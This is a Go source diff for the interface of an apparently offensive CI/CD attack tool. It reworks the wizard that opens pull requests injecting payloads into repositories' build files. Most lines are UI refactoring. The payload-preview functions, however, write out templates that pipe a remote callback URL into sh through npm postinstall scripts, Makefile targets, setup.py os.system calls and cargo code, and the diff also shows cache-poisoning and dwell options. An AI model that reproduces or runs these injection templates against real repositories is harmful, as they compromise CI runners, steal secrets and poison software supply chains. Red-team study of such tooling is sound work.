@@ -15,6 +15,7 @@ import (
 
 	"github.com/boostsecurityio/smokedmeat/internal/buildinfo"
 	"github.com/boostsecurityio/smokedmeat/internal/cachepoison"
+	"github.com/boostsecurityio/smokedmeat/internal/lotp"
 	"github.com/boostsecurityio/smokedmeat/internal/stagerurl"
 )
 
@@ -1508,13 +1509,11 @@ func (m *Model) buildWizardModal(width, height int) []string {
 			helpKeyStyle.Render("Esc") + helpDescStyle.Render(":back")
 	case 3:
 		action := ":deploy  "
-		dwellHint := ""
 		switch m.wizard.DeliveryMethod {
 		case DeliveryCopyOnly, DeliveryManualSteps:
 			action = ":copy  "
-		case DeliveryIssue, DeliveryComment, DeliveryAutoPR:
-			dwellHint = helpKeyStyle.Render("d") + helpDescStyle.Render(":dwell  ")
 		}
+		dwellHint := helpKeyStyle.Render("d") + helpDescStyle.Render(":dwell  ")
 		hints = helpKeyStyle.Render("Enter") + helpDescStyle.Render(action) + dwellHint +
 			helpKeyStyle.Render("Esc") + helpDescStyle.Render(":back")
 	}
@@ -1531,10 +1530,7 @@ func (m *Model) buildWizardModal(width, height int) []string {
 
 	// Pad each line to exact visual width to prevent background bleed-through
 	for i, line := range lines {
-		visualWidth := lipgloss.Width(line)
-		if visualWidth < width {
-			lines[i] = line + strings.Repeat(" ", width-visualWidth)
-		}
+		lines[i] = padRight(line, width)
 	}
 
 	return lines
@@ -1772,7 +1768,7 @@ func (m *Model) buildWizardStep3Content(width int) []string {
 
 	switch m.wizard.DeliveryMethod {
 	case DeliveryLOTP:
-		return m.buildWizardStep3LOTP(width)
+		lines = append(lines, m.buildWizardStep3LOTPSummary(width)...)
 	case DeliveryIssue:
 		readyMsg := "Ready to create issue!"
 		if m.wizard.SelectedVuln != nil && isCommentInjection(m.wizard.SelectedVuln) {
@@ -1989,27 +1985,37 @@ func (m *Model) buildWizardStep3Content(width int) []string {
 		)
 	}
 
-	statusState, statusReason := m.deliveryMethodStatus(m.wizard.DeliveryMethod)
-	switch statusState {
-	case deployStateConfirmed:
-		lines = append(lines, formatWizardContent(pad, "", successColor.Render("This path worked before with this token"), innerWidth), emptyLine)
-	case deployStateUnknown:
-		if statusReason != "" {
-			lines = append(lines, formatWizardContent(pad, "", warningColor.Render(statusReason), innerWidth), emptyLine)
-		}
-	case deployStateFail, deployStateDenied:
-		if statusReason != "" {
-			lines = append(lines, formatWizardContent(pad, "", errorColor.Render(statusReason), innerWidth), emptyLine)
+	if m.wizard.DeliveryMethod != DeliveryLOTP {
+		statusState, statusReason := m.deliveryMethodStatus(m.wizard.DeliveryMethod)
+		switch statusState {
+		case deployStateConfirmed:
+			lines = append(lines, formatWizardContent(pad, "", successColor.Render("This path worked before with this token"), innerWidth), emptyLine)
+		case deployStateUnknown:
+			if statusReason != "" {
+				lines = append(lines, formatWizardContent(pad, "", warningColor.Render(statusReason), innerWidth), emptyLine)
+			}
+		case deployStateFail, deployStateDenied:
+			if statusReason != "" {
+				lines = append(lines, formatWizardContent(pad, "", errorColor.Render(statusReason), innerWidth), emptyLine)
+			}
 		}
 	}
 
-	lines = append(lines, m.renderCachePoisonOption(pad, innerWidth)...)
+	if m.wizard.DeliveryMethod != DeliveryLOTP {
+		lines = append(lines, m.renderCachePoisonOption(pad, innerWidth)...)
+	}
 
 	if m.wizard.SelectedVuln != nil {
 		lines = append(lines, formatWizardContent(pad, "Repository:", m.wizard.SelectedVuln.Repository, innerWidth))
 	}
+	if m.wizard.DeliveryMethod == DeliveryLOTP {
+		lines = append(lines, m.buildWizardStep3LOTP(width)...)
+	}
 	// Skip payload summary for methods that already show it above
-	if m.wizard.Payload != "" && m.wizard.DeliveryMethod != DeliveryCopyOnly && m.wizard.DeliveryMethod != DeliveryManualSteps {
+	if m.wizard.Payload != "" &&
+		m.wizard.DeliveryMethod != DeliveryCopyOnly &&
+		m.wizard.DeliveryMethod != DeliveryManualSteps &&
+		m.wizard.DeliveryMethod != DeliveryLOTP {
 		payload := m.wizard.Payload
 		if len(payload) > innerWidth-20 {
 			payload = payload[:innerWidth-23] + "..."
@@ -2043,6 +2049,13 @@ func (m *Model) buildWizardStep3Content(width int) []string {
 
 func (m *Model) renderDwellTimeOption(pad string, innerWidth int) []string {
 	emptyLine := strings.Repeat(" ", innerWidth)
+	return []string{
+		m.renderDwellTimeLine(pad, innerWidth),
+		emptyLine,
+	}
+}
+
+func (m *Model) renderDwellTimeLine(pad string, innerWidth int) string {
 	dwellLabel := "Express (grab & exit)"
 	if m.wizard != nil && m.wizard.CachePoisonEnabled {
 		dwell := cachePoisonPersistentDwell(m.wizard.DwellTime)
@@ -2050,26 +2063,31 @@ func (m *Model) renderDwellTimeOption(pad string, innerWidth int) []string {
 	} else if m.wizard.DwellTime > 0 {
 		dwellLabel = fmt.Sprintf("Dwell %s (stay active)", m.wizard.DwellTime)
 	}
+	return formatWizardContent(pad, "Mode:", dwellLabel+" "+mutedColor.Render("[d] to cycle"), innerWidth)
+}
+
+func (m *Model) renderCallbackBudgetOption(pad string, innerWidth int) []string {
+	line := m.renderCallbackBudgetLine(pad, innerWidth)
+	if line == "" {
+		return nil
+	}
+	emptyLine := strings.Repeat(" ", innerWidth)
 	return []string{
-		formatWizardContent(pad, "Mode:", dwellLabel+" "+mutedColor.Render("[d] to cycle"), innerWidth),
+		line,
 		emptyLine,
 	}
 }
 
-func (m *Model) renderCallbackBudgetOption(pad string, innerWidth int) []string {
+func (m *Model) renderCallbackBudgetLine(pad string, innerWidth int) string {
 	if m.wizard == nil || m.wizard.CachePoisonEnabled {
-		return nil
+		return ""
 	}
-	emptyLine := strings.Repeat(" ", innerWidth)
 	budget := m.wizard.CallbackBudget
 	if budget <= 0 {
 		budget = 1
 	}
 	label := fmt.Sprintf("Stager expires after %d callback(s)", budget)
-	return []string{
-		formatWizardContent(pad, "Callbacks:", label+" "+mutedColor.Render("[b] to cycle"), innerWidth),
-		emptyLine,
-	}
+	return formatWizardContent(pad, "Callbacks:", label+" "+mutedColor.Render("[b] to cycle"), innerWidth)
 }
 
 func (m *Model) renderDraftOption(pad string, innerWidth int) []string {
@@ -2095,6 +2113,14 @@ func (m *Model) renderAutoCloseOption(pad string, innerWidth int) []string {
 }
 
 func (m *Model) renderCachePoisonOption(pad string, innerWidth int) []string {
+	lines := m.renderCachePoisonCompact(pad, innerWidth)
+	if len(lines) == 0 {
+		return nil
+	}
+	return append(lines, strings.Repeat(" ", innerWidth))
+}
+
+func (m *Model) renderCachePoisonCompact(pad string, innerWidth int) []string {
 	if m.wizard == nil {
 		return nil
 	}
@@ -2106,7 +2132,6 @@ func (m *Model) renderCachePoisonOption(pad string, innerWidth int) []string {
 		}
 		return []string{
 			formatWizardContent(pad, "Cache Poisoning:", mutedColor.Render("N/A ("+reason+")"), innerWidth),
-			strings.Repeat(" ", innerWidth),
 		}
 	}
 
@@ -2118,13 +2143,11 @@ func (m *Model) renderCachePoisonOption(pad string, innerWidth int) []string {
 		formatWizardContent(pad, "Cache Poisoning:", label+" "+mutedColor.Render("[c] to toggle"), innerWidth),
 	}
 	if !m.wizard.CachePoisonEnabled {
-		lines = append(lines, strings.Repeat(" ", innerWidth))
 		return lines
 	}
 
 	victim := m.selectedCachePoisonVictim()
 	if victim == nil {
-		lines = append(lines, strings.Repeat(" ", innerWidth))
 		return lines
 	}
 
@@ -2160,51 +2183,65 @@ func (m *Model) renderCachePoisonOption(pad string, innerWidth int) []string {
 	if uses := cachepoison.CheckoutUsesForCandidate(*victim); len(uses) > 0 {
 		lines = append(lines, formatWizardContent(pad, "Checkout:", strings.Join(uses, ", "), innerWidth))
 	}
-	return append(lines, strings.Repeat(" ", innerWidth))
+	return lines
+}
+
+func (m *Model) buildWizardStep3LOTPSummary(width int) []string {
+	var lines []string
+	innerWidth := width - 2
+	pad := "  "
+	emptyLine := strings.Repeat(" ", innerWidth)
+
+	lines = append(lines,
+		formatWizardContent(pad, "", "Ready to create LOTP PR!", innerWidth),
+		emptyLine,
+	)
+
+	if m.wizard.SelectedVuln != nil {
+		tool := m.wizard.SelectedVuln.LOTPTool
+		if tool == "" {
+			tool = m.wizard.SelectedVuln.LOTPAction
+		}
+		if tool != "" {
+			lines = append(lines, formatWizardContent(pad, "Tool:", warningColor.Render(tool), innerWidth))
+		}
+		if len(m.wizard.SelectedVuln.LOTPTargets) > 0 {
+			lines = append(lines, formatWizardContent(pad, "Files:", warningColor.Render(strings.Join(m.wizard.SelectedVuln.LOTPTargets, ", ")), innerWidth))
+		}
+		lines = append(lines, emptyLine)
+	}
+
+	lines = append(lines,
+		formatWizardContent(pad, "", warningColor.Render("⚠️  THIS WILL CREATE A REAL PR WITH MALICIOUS FILE CHANGES"), innerWidth),
+		emptyLine,
+		m.renderDwellTimeLine(pad, innerWidth),
+	)
+	if callbacksLine := m.renderCallbackBudgetLine(pad, innerWidth); callbacksLine != "" {
+		lines = append(lines, callbacksLine)
+	}
+	lines = append(lines, m.renderCachePoisonCompact(pad, innerWidth)...)
+
+	return lines
 }
 
 func (m *Model) buildWizardStep3LOTP(width int) []string {
 	var lines []string
 	innerWidth := width - 2
 	pad := "  "
-	emptyLine := strings.Repeat(" ", innerWidth)
 
 	tool := "npm"
-	if m.wizard.SelectedVuln != nil {
+	var targets []string
+	if m.wizard != nil && m.wizard.SelectedVuln != nil {
 		if m.wizard.SelectedVuln.LOTPTool != "" {
 			tool = m.wizard.SelectedVuln.LOTPTool
 		} else if m.wizard.SelectedVuln.LOTPAction != "" {
 			tool = m.wizard.SelectedVuln.LOTPAction
 		}
+		targets = m.wizard.SelectedVuln.LOTPTargets
 	}
 
-	lines = append(lines,
-		formatWizardContent(pad, "", secondaryColorStyle.Render("Deploy: "+tool+" LOTP"), innerWidth),
-		emptyLine,
-		formatWizardContent(pad, "", "What happens:", innerWidth),
-		formatWizardContent(pad, "", "  1. Injects payload into target file(s)", innerWidth),
-		formatWizardContent(pad, "", "  2. CI pipeline executes payload on next run", innerWidth),
-		formatWizardContent(pad, "", "  3. Agent downloads and runs in CI runner", innerWidth),
-		emptyLine,
-	)
-
-	if m.wizard.SelectedVuln != nil {
-		lines = append(lines,
-			formatWizardContent(pad, "Target:", m.wizard.SelectedVuln.Repository, innerWidth),
-			formatWizardContent(pad, "Tool:", warningColor.Render(tool), innerWidth),
-		)
-		if len(m.wizard.SelectedVuln.LOTPTargets) > 0 {
-			lines = append(lines,
-				formatWizardContent(pad, "Files:", warningColor.Render(strings.Join(m.wizard.SelectedVuln.LOTPTargets, ", ")), innerWidth),
-			)
-		}
-		lines = append(lines, emptyLine)
-	}
-
-	isDynamicScript := tool == "bash" || tool == "powershell" || tool == "python"
-	targets := m.wizard.SelectedVuln.LOTPTargets
-
-	callbackURL := stagerurl.Join(m.config.ExternalURL(), "<stager-id>")
+	callbackURL := stagerurl.Join(m.config.ExternalURL(), "preview-stager-id")
+	payloadFile, previewLines, extraFiles := lotpPreview(tool, callbackURL, targets, m.wizard.PayloadPreview)
 
 	boxPad := pad
 	boxPadWidth := lipgloss.Width(boxPad)
@@ -2213,46 +2250,18 @@ func (m *Model) buildWizardStep3LOTP(width int) []string {
 		boxWidth = innerWidth
 		boxPad = ""
 	}
-	if isDynamicScript && len(targets) > 0 {
-		curlCmd := lotpPreviewCurlPipeShCommand(callbackURL)
-		for _, target := range targets {
-			lines = append(lines, m.renderPreviewBox(boxPad, boxWidth, innerWidth, target, []string{
-				warningColor.Render(curlCmd),
-				"... (rest of existing script) ...",
-			})...)
-		}
-	} else {
-		payloadFile := "package.json"
-		if len(targets) > 0 {
-			payloadFile = targets[0]
-		}
-		preview := m.wizard.PayloadPreview
-		if preview == "" {
-			preview = lotpDefaultPreview(tool, callbackURL)
-		}
-		lines = append(lines, m.renderPreviewBox(boxPad, boxWidth, innerWidth, payloadFile, strings.Split(preview, "\n"))...)
-	}
 
-	warningFile := "target files"
-	if isDynamicScript && len(targets) > 0 {
-		warningFile = strings.Join(targets, ", ")
-	} else if len(targets) > 0 {
-		warningFile = targets[0]
+	lines = append(lines, formatWizardContent(pad, "", mutedColor.Render("Preview:"), innerWidth))
+	lines = append(lines, m.renderPreviewBox(boxPad, boxWidth, innerWidth, payloadFile, previewLines)...)
+	if extraFiles > 0 {
+		lines = append(lines, formatWizardContent(pad, "", mutedColor.Render(fmt.Sprintf("+%d more file(s)", extraFiles)), innerWidth))
 	}
-	lines = append(lines,
-		emptyLine,
-		formatWizardContent(pad, "", warningColor.Render("⚠️  THIS WILL CREATE A PR WITH MALICIOUS "+warningFile), innerWidth),
-		emptyLine,
-	)
-	lines = append(lines, m.renderDwellTimeOption(pad, innerWidth)...)
-	lines = append(lines, m.renderCallbackBudgetOption(pad, innerWidth)...)
 
 	return lines
 }
 
 func (m *Model) renderPreviewBox(boxPad string, boxWidth, totalWidth int, filename string, contentLines []string) []string {
-	content := strings.Join(contentLines, "\n")
-	box := renderPreviewBoxContent(boxWidth, content)
+	box := renderPreviewBoxContent(boxWidth, contentLines)
 	actualBoxWidth := lipgloss.Width(box)
 
 	var lines []string
@@ -2268,7 +2277,7 @@ func (m *Model) renderPreviewBox(boxPad string, boxWidth, totalWidth int, filena
 	return lines
 }
 
-func renderPreviewBoxContent(maxWidth int, content string) string {
+func renderPreviewBoxContent(maxWidth int, contentLines []string) string {
 	if maxWidth < 1 {
 		maxWidth = 1
 	}
@@ -2278,32 +2287,106 @@ func renderPreviewBoxContent(maxWidth int, content string) string {
 		BorderForeground(mutedColorVal).
 		PaddingLeft(1)
 
-	for width := maxWidth; width >= 1; width-- {
-		box := previewStyle.Width(width).Render(content)
-		if lipgloss.Width(box) <= maxWidth {
-			return box
-		}
+	contentWidth := maxWidth - previewStyle.GetHorizontalFrameSize()
+	if contentWidth < 1 {
+		contentWidth = 1
 	}
 
-	return previewStyle.Width(1).Render(content)
+	truncated := make([]string, len(contentLines))
+	for i, line := range contentLines {
+		truncated[i] = truncateVisual(line, contentWidth)
+	}
+
+	return previewStyle.Width(maxWidth).Render(strings.Join(truncated, "\n"))
 }
 
-func lotpDefaultPreview(tool, callbackURL string) string {
-	curlCmd := lotpPreviewCurlPipeShCommand(callbackURL)
-	switch tool {
-	case "make":
-		return ".PHONY: all\nall:\n\t@" + curlCmd + "\n\t@$(MAKE) -f Makefile.real all"
-	case "pip":
-		return "from setuptools import setup\nimport os\nos.system(" + fmt.Sprintf("%q", curlCmd) + ")\nsetup(name='pkg', version='1.0.0')"
-	case "cargo":
-		return "fn main() {\n  std::process::Command::new(\"sh\")\n    .arg(\"-c\").arg(" + fmt.Sprintf("%q", curlCmd) + ")\n    .output();\n}"
-	default:
-		return "{\n  \"name\": \"build-tools\",\n  \"version\": \"1.0.0\",\n  \"scripts\": {\n    \"postinstall\": " + fmt.Sprintf("%q", curlCmd) + "\n  }\n}"
+func lotpPreview(tool, callbackURL string, targets []string, payloadPreview string) (payloadFile string, previewLines []string, extraFiles int) {
+	if payloadPreview != "" {
+		payloadFile = "package.json"
+		if len(targets) > 0 {
+			payloadFile = targets[0]
+		}
+		extraFiles = 0
+		if len(targets) > 1 {
+			extraFiles = len(targets) - 1
+		}
+		return payloadFile, summarizePreviewContent(payloadFile, payloadPreview), extraFiles
 	}
+
+	files := lotp.GenerateFiles(tool, targets, callbackURL)
+	if len(files) > 0 {
+		return files[0].Path, summarizePreviewContent(files[0].Path, files[0].Content), len(files) - 1
+	}
+
+	payloadFile = "package.json"
+	if len(targets) > 0 {
+		payloadFile = targets[0]
+	}
+	extraFiles = 0
+	if len(targets) > 1 {
+		extraFiles = len(targets) - 1
+	}
+	return payloadFile, lotpFallbackPreviewLines(tool, callbackURL, len(targets) > 0), extraFiles
+}
+
+func summarizePreviewContent(filename, content string) []string {
+	trimmed := strings.TrimRight(content, "\n")
+	if trimmed == "" {
+		return []string{""}
+	}
+
+	lines := strings.Split(trimmed, "\n")
+	if filename == "package.json" && len(lines) > 5 {
+		if summarized := summarizePackageJSONPreview(lines); len(summarized) > 0 {
+			return summarized
+		}
+	}
+	if len(lines) <= 8 {
+		return lines
+	}
+	return append(append(lines[:2], "..."), lines[len(lines)-2:]...)
+}
+
+func summarizePackageJSONPreview(lines []string) []string {
+	scriptsIdx := -1
+	for i, line := range lines {
+		if strings.Contains(line, `"scripts": {`) {
+			scriptsIdx = i
+			break
+		}
+	}
+	if scriptsIdx < 0 {
+		return nil
+	}
+
+	end := scriptsIdx + 3
+	if end > len(lines) {
+		end = len(lines)
+	}
+	return lines[scriptsIdx:end]
 }
 
 func lotpPreviewCurlPipeShCommand(callbackURL string) string {
 	return fmt.Sprintf("curl -s '%s' | sh", strings.ReplaceAll(callbackURL, "'", "'\"'\"'"))
+}
+
+func lotpFallbackPreviewLines(tool, callbackURL string, hasTargets bool) []string {
+	curlCmd := lotpPreviewCurlPipeShCommand(callbackURL)
+	switch tool {
+	case "bash", "powershell", "python":
+		if hasTargets {
+			return []string{curlCmd, "... (rest of existing script) ..."}
+		}
+		return []string{curlCmd}
+	case "make":
+		return []string{"all:", "\t@" + curlCmd, "\t@$(MAKE) -f Makefile.real all"}
+	case "pip":
+		return []string{"import os", "os.system(" + fmt.Sprintf("%q", curlCmd) + ")", "setup(name='pkg', version='1.0.0')"}
+	case "cargo":
+		return []string{"std::process::Command::new(\"sh\")", "  .arg(\"-c\").arg(" + fmt.Sprintf("%q", curlCmd) + ")", "  .output();"}
+	default:
+		return []string{"\"scripts\": {", "  \"postinstall\": " + fmt.Sprintf("%q", curlCmd), "}"}
+	}
 }
 
 func formatWizardContent(prefix, label, value string, width int) string {
